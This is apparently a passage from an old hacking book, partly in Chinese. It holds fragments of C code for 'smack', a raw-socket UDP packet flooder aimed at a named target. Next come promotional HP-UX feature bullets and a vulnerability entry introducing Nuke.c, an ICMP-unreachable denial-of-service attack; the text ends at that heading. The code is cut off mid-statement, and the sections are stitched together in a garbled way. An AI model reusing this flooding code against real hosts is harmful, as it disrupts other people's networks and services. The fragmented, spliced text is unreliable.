
```c
End customization /*
NULL
};
int i, s, fl, ret;
unsigned int sp, dp;
struct in_addr src, dst;
struct sockaddr_in addr;
char pack[1024];
struct ip *iph;
struct udphdr *udph;
int read_data(void);
int parse_in(char*);
int addserv(char*, unsigned int, char*);
void main(int argc, char *argv[])
{
iph = (struct ip *)pack;
udph = (struct udphdr*)(iph + 1);
if (argc < 2) {
printf("Usage: ./smack <target to fuck>\n", argv[0]);
exit(-1);
}
printf("Slinging Packets... \n");
src.s_addr = inet_addr(argv[1]);
if (src.s_addr == -1) {
    printf("Invalid source IP: %s\n", argv[1]);
    exit(-1);
}
s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
if (s == -1) {
    perror("socket");
    exit(-1);
}

fl = 1;
ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, &fl, sizeof(int));
if (ret == -1) {
    perror("setsockopt");
    exit(-1);
}

bzero((char *)&addr, sizeof(addr));
addr.sin_family = AF_INET;
read_data();
printf("UnFed.\n");
}
int parse_in(char *in)
{
    int i, n, c, m, ret;
    char ip[16], tmp[6], mode, tmp2;
    unsigned int port;
    bzero(ip, 16); bzero(tmp, 6); mode = 0; port = 0; n = 0; c = 0; m = 0;
    tmp2 = 0;
    for (i = 0; i < strlen(in); i++) {
        if (in[i] != ' ') {
            if (in[i] != ':') {
                if (m == 0) {
                    ip[c] = in[i];
                    c++;
                }
                if (m == 1) {
                    tmp[c] = in[i];
                    c++;
                }
                if (m == 2) {
                    tmp2 = in[i];
                    break;
                }
            } else {
                m++; c = 0;
            }
        }
    }
    port = (unsigned int)atoi(tmp);
    mode = (tmp2 - 48);
    addserv(ip
```

```c
#else
  udph->dest    = htons(dp);
  if (mode == 0) {
    udph->len    = htons(sizeof *udph + 12);
    udph->source = htons(rand());
  }
  else {
    udph->len    = htons(sizeof *udph + strlen(conn_packl));
    udph->source = htons(27001);
  }
  #endif
  if (mode == 0) {
    memcpy(udph + 1, conn_pack0, 12);

    ret = sendto(s, pack, PS0, 0, (struct sockaddr *)&addr,
         sizeof(addr));
  }
  else {
    memcpy(udph + 1, conn_packl, strlen(conn_packl));
    ret = sendto(s, pack, PS1, 0, (struct sockaddr *)&addr,
         sizeof(addr));
  }
  if (ret == -1) {
    perror("sendto");
    exit(-1);
  }
```

## HP/UX

对于许多企业级 UNIX 基础设施，惠普（Hewlett-Packard）的 HP-UX 操作系统（www.unixsolutions.hp.com）是运行基于互联网的受业务关键影响的应用程序的绝佳基础。事实上，HP-UX 是前三个数据库套件——Oracle、Informix 和 Sybase——的主流平台。自 11/i 版本发布以来，HP-UX 具备 11 项具有竞争力的特性：

- **64 位处理能力。** 可运行更大的应用程序，并更快地处理大型数据集。

- **行业领先的性能。** 通过 V-Class 和 N-Class 服务器实现。

- **优越的应用组合。** 以具有成本效益的方式交付领先的打包应用软件。

- **轻松升级。** 允许未经修改地使用 9.x 或 10.x 应用程序（也可并排运行 32 位和 64 位）。

- **广泛支持。** 与整个 HP 9000 Enterprise 服务器系列兼容。

- **优越的可扩展性。** 简化了在同一系统内从 1 路到 128 路计算的过渡。

- **增强的弹性。** 最大化正常运行时间。

- **顶级安全性。** 保护从通信到商业交易的应用程序。

- **为电子服务做好准备。** 支持 HP 的互联网电子商务战略。

- **为 IA-64 做好准备。** 二进制兼容性平滑过渡到下一代 IA-64 架构。

- **充满希望的未来。** 由 HP 的资源和专业知识支持。

## 责任

### 拒绝服务攻击

**摘要：** 一种可能终止 IP 连接的拒绝服务（DoS）攻击。

**攻击状态：** 严重拥塞。

**漏洞：** 适用于所有版本。

**入侵：** 由著名超级黑客 Satanic Mechanic 撰写的 *Nuke.c* 是一种拒绝服务攻击，它利用 ICMP 不可达消息几乎可以切断任何 IP 连接。

# Nuke.c
